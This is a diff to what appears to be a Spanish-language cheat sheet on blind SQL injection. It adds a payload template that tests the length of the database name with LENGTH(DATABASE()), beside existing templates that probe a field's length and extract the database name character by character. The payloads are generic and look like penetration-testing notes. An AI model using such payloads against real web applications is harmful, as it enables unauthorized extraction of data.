@@ -23,6 +23,10 @@ En este caso buscamos un campo donde podamos validar una respuesta. Luego buscam
 
         <dato>' AND LEN(<campo a consultar del usuario>)=<length>-- -
 
+### Conseguir el length del nombre de la db
+
+        <dato>’ AND LENGTH(DATABASE())=<length>-- -
+
 ### Dumpear el nombre de una DB:
 
         <dato>’ AND ASCII(SUBSTR(DATABASE(),<index>,X))=<Valor ASCII>
